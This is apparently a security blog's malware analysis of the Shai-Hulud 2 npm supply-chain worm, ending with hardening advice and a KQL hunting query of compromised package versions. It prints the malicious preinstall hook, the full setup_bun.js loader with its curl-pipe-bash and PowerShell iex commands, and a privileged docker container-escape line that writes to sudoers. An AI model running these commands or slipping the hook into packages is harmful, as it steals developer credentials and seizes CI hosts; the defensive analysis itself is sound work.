---
title: "Shai Hulud 2 - Emerging Supply-Chain Threat"
date: 2025-11-24T16:15:30+01:00
draft: false
---

So... Phew. Its time again for shai-hulud to strike once more. 
This morning my alarm bells as threat hunter rang because there was apparently a new wave of supply chain attacks on the npmjs ecosystem. Naturally I had to analyse this case and give you a glimpse of it here on my blog. Alright. Get your coffee, lean back and watch me do my re magic.

Actually this time I was a bit late to analyse this case (around 2-3 hours, unlucky me :( ). 
After reading some initial reporting of npmjs and aikidosec, I went on to retreive a compromised npmjs package on to my local reverseengineeringbox and crack it open. I did this with ```@asyncapi/cli@1.0.0``` as seen [here](https://github.com/asyncapi/cli/blob/2efa4dff59bc3d3cecdf897ccf178f99b115d63d/package.json).

> note: at time of writing this, most packages have the malicious commits and releases removed in npmjs.

Ok so first thing it does at ```npm install <packagename>``` is a so called ```preinstall``` procedure where it will fetch other peer-dependencies.:
The procedure is defined in the package.json file which acts as the core manifest of each npm package and is called from the scripts/preinstall script.

```json
{
  "name": "asyncapi-utility",
  "version": "1.0.0",
  "bin": { "asyncapi-utility": "setup_bun.js" },
  "scripts": {
    "preinstall": "node setup_bun.js"
  },
  "license": "MIT"
}
``` 

So instead of fetching required peer-deps it will actually execute a js script from the root of the project (assuming the target host has nodejs installed). I got my hands on the file ```setup_bun.js```. This is it:

```javascript
#!/usr/bin/env node
const { spawn, execSync } = require('child_process');
const path = require('path');
const fs = require('fs');
const os = require('os');

function isBunOnPath() {
  try {
    const command = process.platform === 'win32' ? 'where bun' : 'which bun';
    execSync(command, { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
}

function reloadPath() {
  // Reload PATH environment variable
  if (process.platform === 'win32') {
    try {
      // On Windows, get updated PATH from registry
      const result = execSync('powershell -c "[Environment]::GetEnvironmentVariable(\'PATH\', \'User\') + \';\' + [Environment]::GetEnvironmentVariable(\'PATH\', \'Machine\')"', {
        encoding: 'utf8'
      });
      process.env.PATH = result.trim();
    } catch {
    }
  } else {
    try {
      // On Unix systems, source common shell profile files
      const homeDir = os.homedir();
      const profileFiles = [
        path.join(homeDir, '.bashrc'),
        path.join(homeDir, '.bash_profile'),
        path.join(homeDir, '.profile'),
        path.join(homeDir, '.zshrc')
      ];

      // Try to source profile files to get updated PATH
      for (const profileFile of profileFiles) {
        if (fs.existsSync(profileFile)) {
          try {
            const result = execSync(`bash -c "source ${profileFile} && echo $PATH"`, {
              encoding: 'utf8',
              stdio: ['pipe', 'pipe', 'ignore']
            });
            if (result && result.trim()) {
              process.env.PATH = result.trim();
              break;
            }
          } catch {
            // Continue to next profile file
          }
        }
      }

      // Also check if ~/.bun/bin exists and add it to PATH if not already there
      const bunBinDir = path.join(homeDir, '.bun', 'bin');
      if (fs.existsSync(bunBinDir) && !process.env.PATH.includes(bunBinDir)) {
        process.env.PATH = `${bunBinDir}:${process.env.PATH}`;
      }
    } catch {}
  }
}

async function downloadAndSetupBun() {
  try {
    let command;
    if (process.platform === 'win32') {
      // Windows: Use PowerShell script
      command = 'powershell -c "irm bun.sh/install.ps1|iex"';
    } else {
      // Linux/macOS: Use curl + bash script
      command = 'curl -fsSL https://bun.sh/install | bash';
    }

    execSync(command, {
      stdio: 'ignore',
      env: { ...process.env }
    });

    // Reload PATH to pick up newly installed bun
    reloadPath();

    // Find bun executable after installation
    const bunPath = findBunExecutable();
    if (!bunPath) {
      throw new Error('Bun installation completed but executable not found');
    }

    return bunPath;
  } catch  {
    process.exit(0);
  }
}

function findBunExecutable() {
  // Common locations where bun might be installed
  const possiblePaths = [];

  if (process.platform === 'win32') {
    // Windows locations
    const userProfile = process.env.USERPROFILE || '';
    possiblePaths.push(
      path.join(userProfile, '.bun', 'bin', 'bun.exe'),
      path.join(userProfile, 'AppData', 'Local', 'bun', 'bun.exe')
    );
  } else {
    // Unix locations
    const homeDir = os.homedir();
    possiblePaths.push(
      path.join(homeDir, '.bun', 'bin', 'bun'),
      '/usr/local/bin/bun',
      '/opt/bun/bin/bun'
    );
  }

  // Check if bun is now available on PATH
  if (isBunOnPath()) {
    return 'bun';
  }

  // Check common installation paths
  for (const bunPath of possiblePaths) {
    if (fs.existsSync(bunPath)) {
      return bunPath;
    }
  }

  return null;
}

function runExecutable(execPath, args = [], opts = {}) {
  const child = spawn(execPath, args, {
    stdio: 'ignore',
    cwd: opts.cwd || process.cwd(),
    env: Object.assign({}, process.env, opts.env || {})
  });

  child.on('error', (err) => {
    process.exit(0);
  });

  child.on('exit', (code, signal) => {
    if (signal) {
      process.exit(0);
    } else {
      process.exit(code === null ? 1 : code);
    }
  });
}

// Main execution
async function main() {
  let bunExecutable;

  if (isBunOnPath()) {
    // Use bun from PATH
    bunExecutable = 'bun';
  } else {
    // Check if we have a locally downloaded bun
    const localBunDir = path.join(__dirname, 'bun-dist');
    const possiblePaths = [
      path.join(localBunDir, 'bun', 'bun'),
      path.join(localBunDir, 'bun', 'bun.exe'),
      path.join(localBunDir, 'bun.exe'),
      path.join(localBunDir, 'bun')
    ];

    const existingBun = possiblePaths.find(p => fs.existsSync(p));

    if (existingBun) {
      bunExecutable = existingBun;
    } else {
      // Download and setup bun
      bunExecutable = await downloadAndSetupBun();
    }
  }

  const environmentScript = path.join(__dirname, 'bun_environment.js');
  if (fs.existsSync(environmentScript)) {
    runExecutable(bunExecutable, [environmentScript]);
  } else {
    process.exit(0);
  }
}

main().catch((error) => {
  process.exit(0);
});
```

Allright, take a deep breath, its not difficult to read and actually very nice of the hacker to not obfuscate this code :). The main functionality lies in the entrypoint as called from ```async function main()```. All this does is, it will check the $PATH environment variable and check if the [bunjs runtime](https://bun.com) is installed. If not, it will install bunjs by calling the relevant function ```downloadAndSetupBun()```.
This function will then execute, depending on the host platform an install command such as:

```bash
powershell -c "irm bun.sh/install.ps1|iex
curl -fsSL https://bun.sh/install | bash
```

and then add it to $PATH. After that is done, it will move on to execute a second js script called ```bun_environment.js``` from the project root dir. This script is the actual malicious body. Once executed, it will run an embedded trufflehog binary to scan for leaked credentials, create randomly named github repositories and uploads them there. 

![github repos](https://cdn.prod.website-files.com/642adcaf364024654c71df23/69244323f1c8b48f69d4eccf_2025-11-24_12-35-41.png)

The actual malicious script is actually huge (around 10 mb of obfuscated code). So I will probably not go through it here as it would explode my scope. But as you can see, within the last 24 hours or so, aikidosec detected around 26.3k repositories containing leaked secrets by shai-hulud. After leaking creds, the script will try to enumerate vulnerable npm packages in the registry and try to replicate itself to these packages by reusing compromised credentials found by trufflehog. Another interesting find is if the malware is installed from a CI pipeline, it will detect if it is running on a docker runner and will then attempt to escape the container and gain privileged access levels as seen in this subcommand:

```js
await Bun['$']`docker run --rm --privileged -v /:/host ubuntu bash -c "cp /host/tmp/runner /host/etc/sudoers.d/runner"
```

This version of shai-hulud also tries to reuse stolen github credentials to setup github workflows to host sort of a C2 server from which it can scan for new credentials and exfiltrate them to the respective repo.


## Defending agains the worms 🪱

If you want to defend against the worm, please harden your ci/cd pipelines by using ```npm audit``` to run a pre-build check and scan for vulnerable/compromised packages. Also try to remove or refactor pipelines that use ```npm postinstall | npm preinstall``` scripts to prevent fetching of other unwanted dependencies.
Please also monitor the usage of ```trufflehog``` on your environment and block unwanted matches .Another important part is to talk to affected developers and check if their development environment is infected. I wrote a KQL query for this as seen below:

```bash
let malpackages = dynamic(["@zapier/zapier-sdk@0.15.5",
"@zapier/zapier-sdk@0.15.7",
"@posthog/core@1.5.6",
"posthog-node@5.11.3",
"posthog-node@5.13.3",
"posthog-node@4.18.1",
"@asyncapi/specs@6.10.1",
"@asyncapi/specs@6.8.2",
"@asyncapi/specs@6.9.1",
"@asyncapi/specs@6.8.3",
"@postman/tunnel-agent@0.6.6",
"@postman/tunnel-agent@0.6.5",
"posthog-react-native@4.12.5",
"posthog-react-native@4.11.1",
"@asyncapi/parser@3.4.1",
"@asyncapi/parser@3.4.2",
"@asyncapi/openapi-schema-parser@3.0.25",
"@asyncapi/avro-schema-parser@3.0.25",
"@asyncapi/avro-schema-parser@3.0.26",
"@asyncapi/protobuf-schema-parser@3.6.1",
"@asyncapi/protobuf-schema-parser@3.5.3",
"@asyncapi/react-component@2.6.6",
"@asyncapi/generator@2.8.5",
"@posthog/ai@7.1.2",
"@asyncapi/modelina@5.10.2",
"@asyncapi/modelina@5.10.3",
"@asyncapi/generator-react-sdk@1.1.4",
"@asyncapi/generator-react-sdk@1.1.5",
"@postman/csv-parse@4.0.3",
"@postman/csv-parse@4.0.4",
"@postman/csv-parse@4.0.5",
"posthog-react-native-session-replay@1.2.2",
"@asyncapi/converter@1.6.3",
"@asyncapi/multi-parser@2.2.1",
"@asyncapi/multi-parser@2.2.2",
"@posthog/cli@0.5.15",
"@zapier/secret-scrubber@1.1.3",
"@zapier/secret-scrubber@1.1.4",
"@zapier/secret-scrubber@1.1.5",
"zapier-platform-schema@18.0.2",
"zapier-platform-core@18.0.2",
"zapier-platform-core@18.0.3",
"@ensdomains/address-encoder@1.1.5",
"@ensdomains/content-hash@3.0.1",
"crypto-addr-codec@0.1.9",
"@asyncapi/nunjucks-filters@2.1.1",
"@asyncapi/nunjucks-filters@2.1.2",
"@asyncapi/bundler@0.6.5",
"@asyncapi/bundler@0.6.6",
"@posthog/nextjs-config@1.5.1",
"@asyncapi/html-template@3.3.2",
"@asyncapi/html-template@3.3.3",
"@asyncapi/diff@0.5.1",
"@asyncapi/diff@0.5.2",
"@asyncapi/cli@4.1.2",
"@asyncapi/optimizer@1.0.5",
"@asyncapi/optimizer@1.0.6",
"@asyncapi/modelina-cli@5.10.2",
"@asyncapi/modelina-cli@5.10.3",
"@postman/aether-icons@2.23.2",
"@postman/aether-icons@2.23.4",
"@asyncapi/generator-components@0.3.2",
"@asyncapi/generator-helpers@0.2.1",
"@asyncapi/generator-helpers@0.2.2",
"zapier-platform-cli@18.0.3",
"@posthog/rrweb@0.0.31",
"ethereum-ens@0.8.1",
"@posthog/rrweb-utils@0.0.31",
"@posthog/rrweb-snapshot@0.0.31",
"@posthog/rrdom@0.0.31",
"@asyncapi/problem@1.0.1",
"@asyncapi/problem@1.0.2",
"@postman/secret-scanner-wasm@2.1.3",
"@postman/secret-scanner-wasm@2.1.2",
"@postman/secret-scanner-wasm@2.1.4",
"@ensdomains/eth-ens-namehash@2.0.16",
"posthog-docusaurus@2.0.6",
"@postman/pretty-ms@6.1.1",
"@postman/pretty-ms@6.1.3",
"@postman/pretty-ms@6.1.2",
"web-types-lit@0.1.1",
"mcp-use@1.4.2",
"mcp-use@1.4.3",
"@posthog/react-rrweb-player@1.1.4",
"@asyncapi/markdown-template@1.6.8",
"@asyncapi/markdown-template@1.6.9",
"@ensdomains/buffer@0.1.2",
"@postman/node-keytar@7.9.4",
"@postman/node-keytar@7.9.5",
"@postman/node-keytar@7.9.6",
"@mcp-use/inspector@0.6.2",
"@mcp-use/inspector@0.6.3",
"@mcp-use/cli@2.2.6",
"@zapier/spectral-api-ruleset@1.9.1",
"@zapier/spectral-api-ruleset@1.9.2",
"@zapier/spectral-api-ruleset@1.9.3",
"@posthog/geoip-plugin@0.0.8",
"@ensdomains/dnsprovejs@0.5.3",
"@ensdomains/solsha1@0.0.4",
"@asyncapi/web-component@2.6.6",
"@asyncapi/web-component@2.6.7",
"@posthog/nuxt@1.2.9",
"@zapier/browserslist-config-zapier@1.0.3",
"@zapier/browserslist-config-zapier@1.0.5",
"@posthog/wizard@1.18.1",
"react-native-use-modal@1.0.3",
"@asyncapi/java-spring-template@1.6.1",
"@asyncapi/java-spring-template@1.6.2",
"@posthog/rrweb-record@0.0.31",
"@posthog/siphash@1.1.2",
"@posthog/piscina@3.2.1",
"@ensdomains/ens-validation@0.1.1",
"@posthog/plugin-contrib@0.0.6",
"@posthog/agent@1.24.1",
"@postman/postman-mcp-server@2.4.11",
"@postman/postman-mcp-server@2.4.10",
"@asyncapi/nodejs-ws-template@0.10.1",
"@asyncapi/nodejs-ws-template@0.10.2",
"@actbase/react-daum-postcode@1.0.5",
"token.js-fork@0.7.32",
"@postman/pm-bin-windows-x64@1.24.5",
"@postman/pm-bin-windows-x64@1.24.4",
"@ensdomains/ens-avatar@1.0.4",
"@postman/pm-bin-linux-x64@1.24.3",
"@postman/pm-bin-linux-x64@1.24.4",
"@postman/pm-bin-linux-x64@1.24.5",
"@posthog/hedgehog-mode@0.0.42",
"create-mcp-use-app@0.5.3",
"create-mcp-use-app@0.5.4",
"@postman/pm-bin-macos-arm64@1.24.5",
"@postman/pm-bin-macos-arm64@1.24.3",
"@postman/pm-bin-macos-arm64@1.24.4",
"@posthog/nextjs@0.0.3",
"@postman/pm-bin-macos-x64@1.24.3",
"@postman/pm-bin-macos-x64@1.24.5",
"redux-router-kit@1.2.2",
"redux-router-kit@1.2.3",
"redux-router-kit@1.2.4",
"@ensdomains/dnssecoraclejs@0.2.9",
"@postman/mcp-ui-client@5.5.1",
"@postman/mcp-ui-client@5.5.2",
"@postman/postman-mcp-cli@1.0.5",
"@postman/postman-mcp-cli@1.0.4",
"@zapier/babel-preset-zapier@6.4.1",
"@zapier/babel-preset-zapier@6.4.3",
"@ensdomains/thorin@0.6.51",
"@postman/postman-collection-fork@4.3.3",
"@postman/postman-collection-fork@4.3.4",
"@postman/postman-collection-fork@4.3.5",
"@asyncapi/nodejs-template@3.0.5",
"@postman/wdio-allure-reporter@0.0.9",
"@postman/wdio-junit-reporter@0.0.4",
"@postman/wdio-junit-reporter@0.0.6",
"@postman/final-node-keytar@7.9.1",
"@postman/final-node-keytar@7.9.2",
"zapier-async-storage@1.0.1",
"zapier-async-storage@1.0.2",
"zapier-async-storage@1.0.3",
"@ensdomains/test-utils@1.3.1",
"@ensdomains/hardhat-chai-matchers-viem@0.1.15",
"@asyncapi/java-spring-cloud-stream-template@0.13.5",
"@asyncapi/java-spring-cloud-stream-template@0.13.6",
"@zapier/eslint-plugin-zapier@11.0.3",
"@zapier/eslint-plugin-zapier@11.0.4",
"@zapier/eslint-plugin-zapier@11.0.5",
"devstart-cli@1.0.6",
"@asyncapi/java-template@0.3.5",
"@asyncapi/java-template@0.3.6",
"@asyncapi/go-watermill-template@0.2.76",
"@asyncapi/go-watermill-template@0.2.77",
"@asyncapi/python-paho-template@0.2.14",
"@asyncapi/python-paho-template@0.2.15",
"@ensdomains/hardhat-toolbox-viem-extended@0.0.6",
"@ensdomains/vite-plugin-i18next-loader@4.0.4",
"zapier-platform-legacy-scripting-runner@4.0.3",
"zapier-platform-legacy-scripting-runner@4.0.4",
"@asyncapi/server-api@0.16.25",
"@ensdomains/offchain-resolver-contracts@0.2.2",
"@zapier/ai-actions@0.1.18",
"@zapier/ai-actions@0.1.19",
"@zapier/ai-actions@0.1.20",
"@zapier/mcp-integration@3.0.1",
"@zapier/mcp-integration@3.0.3",
"@ensdomains/ens-archived-contracts@0.0.3",
"@ensdomains/dnssec-oracle-anchors@0.0.2",
"@ensdomains/mock@2.1.52",
"zapier-scripts@7.8.3",
"zapier-scripts@7.8.4",
"@quick-start-soft/quick-task-refine@1.4.2511142126",
"@zapier/ai-actions-react@0.1.13",
"@zapier/ai-actions-react@0.1.14",
"@quick-start-soft/quick-git-clean-markdown@1.4.2511142126",
"@ensdomains/ui@3.4.6",
"@quick-start-soft/quick-markdown@1.4.2511142126",
"@zapier/stubtree@0.1.3",
"@ensdomains/unruggable-gateways@0.0.3",
"@posthog/rrweb-player@0.0.31",
"@asyncapi/dotnet-rabbitmq-template@1.0.1",
"@asyncapi/dotnet-rabbitmq-template@1.0.2",
"@ensdomains/react-ens-address@0.0.32",
"@asyncapi/php-template@0.1.1",
"@quick-start-soft/quick-document-translator@1.4.2511142126",
"@quick-start-soft/quick-markdown-image@1.4.2511142126",
"@strapbuild/react-native-date-time-picker@2.0.4",
"github-action-for-generator@2.1.28",
"@actbase/react-kakaosdk@0.9.27",
"bytecode-checker-cli@1.0.8",
"@markvivanco/app-version-checker@1.0.1",
"bytecode-checker-cli@1.0.9",
"@markvivanco/app-version-checker@1.0.2",
"bytecode-checker-cli@1.0.10",
"@louisle2/cortex-js@0.1.6",
"orbit-boxicons@2.1.3",
"react-native-worklet-functions@3.3.3",
"poper-react-sdk@0.1.2",
"@ensdomains/web3modal@1.10.2",
"gate-evm-tools-test@1.0.5",
"n8n-nodes-tmdb@0.5.1",
"gate-evm-tools-test@1.0.6",
"gate-evm-tools-test@1.0.7",
"capacitor-plugin-purchase@0.1.1",
"expo-audio-session@0.2.1",
"capacitor-plugin-apptrackingios@0.0.21",
"asyncapi-preview@1.0.1",
"asyncapi-preview@1.0.2",
"@actbase/react-absolute@0.8.3",
"@actbase/react-native-devtools@0.1.3",
"@posthog/variance-plugin@0.0.8",
"@posthog/twitter-followers-plugin@0.0.8",
"medusa-plugin-momo@0.0.68",
"scgs-capacitor-subscribe@1.0.11",
"gate-evm-check-code2@2.0.3",
"gate-evm-check-code2@2.0.4",
"gate-evm-check-code2@2.0.5",
"lite-serper-mcp-server@0.2.2",
"@asyncapi/edavisualiser@1.2.1",
"@asyncapi/edavisualiser@1.2.2",
"esbuild-plugin-eta@0.1.1",
"@ensdomains/server-analytics@0.0.2",
"zuper-stream@2.0.9",
"@quick-start-soft/quick-markdown-compose@1.4.2506300029",
"@posthog/snowflake-export-plugin@0.0.8",
"@actbase/react-native-kakao-channel@1.0.2",
"@posthog/sendgrid-plugin@0.0.8",
"evm-checkcode-cli@1.0.12",
"@ensdomains/subdomain-registrar@0.2.4",
"claude-token-updater@1.0.3",
"evm-checkcode-cli@1.0.13",
"evm-checkcode-cli@1.0.14",
"@trigo/atrix-pubsub@4.0.3",
"@trigo/hapi-auth-signedlink@1.3.1",
"@strapbuild/react-native-perspective-image-cropper-poojan31@0.4.6",
"axios-builder@1.2.1",
"calc-loan-interest@1.0.4",
"medusa-plugin-announcement@0.0.3",
"open2internet@0.1.1",
"@ensdomains/cypress-metamask@1.2.1",
"@ensdomains/renewal@0.0.13",
"cpu-instructions@0.0.14",
"orbit-soap@0.43.13",
"@asyncapi/keeper@0.0.2",
"@strapbuild/react-native-perspective-image-cropper-2@0.4.7",
"@actbase/react-native-actionsheet@1.0.3",
"@posthog/ingestion-alert-plugin@0.0.8",
"@actbase/react-native-simple-video@1.0.13",
"@actbase/react-native-kakao-navi@2.0.4",
"medusa-plugin-zalopay@0.0.40",
"@kvytech/medusa-plugin-newsletter@0.0.5",
"@posthog/databricks-plugin@0.0.8",
"@asyncapi/keeper@0.0.3",
"capacitor-voice-recorder-wav@6.0.3",
"create-hardhat3-app@1.1.1",
"rollup-plugin-httpfile@0.2.1",
"@ensdomains/name-wrapper@1.0.1",
"create-hardhat3-app@1.1.2",
"test-foundry-app@1.0.3",
"jan-browser@0.13.1",
"@mparpaillon/page@1.0.1",
"go-template@0.1.8",
"@strapbuild/react-native-perspective-image-cropper@0.4.15",
"manual-billing-system-miniapp-api@1.3.1",
"korea-administrative-area-geo-json-util@1.0.7",
"@posthog/currency-normalization-plugin@0.0.8",
"@posthog/web-dev-server@1.0.5",
"@posthog/pagerduty-plugin@0.0.8",
"@posthog/event-sequence-timer-plugin@0.0.8",
"@posthog/automatic-cohorts-plugin@0.0.8",
"@posthog/first-time-event-tracker@0.0.8",
"@actbase/css-to-react-native-transform@1.0.3",
"@posthog/url-normalizer-plugin@0.0.8",
"@posthog/twilio-plugin@0.0.8",
"@actbase/node-server@1.1.19",
"@posthog/gitub-star-sync-plugin@0.0.8",
"@seung-ju/react-native-action-sheet@0.2.1",
"@posthog/maxmind-plugin@0.1.6",
"@posthog/github-release-tracking-plugin@0.0.8",
"@actbase/react-native-fast-image@8.5.13",
"@posthog/customerio-plugin@0.0.8",
"@posthog/kinesis-plugin@0.0.8",
"@actbase/react-native-less-transformer@1.0.6",
"@posthog/taxonomy-plugin@0.0.8",
"medusa-plugin-product-reviews-kvy@0.0.4",
"@aryanhussain/my-angular-lib@0.0.23",
"dotnet-template@0.0.4",
"capacitor-plugin-scgssigninwithgoogle@0.0.5",
"capacitor-purchase-history@0.0.10",
"@posthog/plugin-unduplicates@0.0.8",
"posthog-plugin-hello-world@1.0.1",
"esbuild-plugin-httpfile@0.4.1",
"@ensdomains/blacklist@1.0.1",
"@ensdomains/renewal-widget@0.1.10",
"@ensdomains/hackathon-registrar@1.0.5",
"@ensdomains/ccip-read-router@0.0.7",
"@mcp-use/mcp-use@1.0.1",
"test-hardhat-app@1.0.3",
"zuper-cli@1.0.1",
"skills-use@0.1.2",
"typeorm-orbit@0.2.27",
"orbit-nebula-editor@1.0.2",
"@trigo/atrix-elasticsearch@2.0.1",
"@trigo/atrix-soap@1.0.2",
"eslint-config-zeallat-base@1.0.4",
"iron-shield-miniapp@0.0.2",
"shinhan-limit-scrap@1.0.3",
"create-glee-app@0.2.3",
"@seung-ju/next@0.0.2",
"@actbase/react-native-tiktok@1.1.3",
"discord-bot-server@0.1.2",
"@seung-ju/openapi-generator@0.0.4",
"@seung-ju/react-hooks@0.0.2",
"@actbase/react-native-naver-login@1.0.1",
"@kvytech/medusa-plugin-announcement@0.0.8",
"@kvytech/components@0.0.2",
"@kvytech/cli@0.0.7",
"@kvytech/medusa-plugin-management@0.0.5",
"@kvytech/medusa-plugin-product-reviews@0.0.9",
"@kvytech/web@0.0.2",
"scgsffcreator@1.0.5",
"vite-plugin-httpfile@0.2.1",
"@ensdomains/curvearithmetics@1.0.1",
"@ensdomains/reverse-records@1.0.1",
"@ensdomains/ccip-read-dns-gateway@0.1.1",
"@ensdomains/unicode-confusables@0.1.1",
"@ensdomains/durin-middleware@0.0.2",
"@ensdomains/ccip-read-worker-viem@0.0.4",
"atrix@1.0.1",
"@caretive/caret-cli@0.0.2",
"exact-ticker@0.3.5",
"@orbitgtbelgium/orbit-components@1.2.9",
"react-library-setup@0.0.6",
"@orbitgtbelgium/mapbox-gl-draw-scale-rotate-mode@1.1.1",
"orbit-nebula-draw-tools@1.0.10",
"@orbitgtbelgium/time-slider@1.0.187",
"react-element-prompt-inspector@0.1.18",
"@trigo/pathfinder-ui-css@0.1.1",
"eslint-config-trigo@22.0.2",
"@trigo/fsm@3.4.2",
"@trigo/atrix@7.0.1",
"@trigo/atrix-postgres@1.0.3",
"trigo-react-app@4.1.2",
"@trigo/eslint-config-trigo@3.3.1",
"@trigo/bool-expressions@4.1.3",
"@trigo/trigo-hapijs@5.0.1",
"@trigo/node-soap@0.5.4",
"@trigo/jsdt@0.2.1",
"bool-expressions@0.1.2",
"@trigo/atrix-redis@1.0.2",
"@trigo/atrix-acl@4.0.2",
"@trigo/atrix-orientdb@1.0.2",
"@trigo/atrix-mongoose@1.0.2",
"atrix-mongoose@1.0.1",
"redux-forge@2.5.3",
"@trigo/keycloak-api@1.3.1",
"@mparpaillon/connector-parse@1.0.1",
"@mparpaillon/imagesloaded@4.1.2",
"@alaan/s2s-auth@2.0.3"]);

DeviceProcessEvents
| where ProcessCommandLine has_any (malpackages);

DeviceFileEvents
| where FolderPath has_any (malpackages);
```

## Indicators-of-Compromise

- Matches on the KQL Query as seen earlier
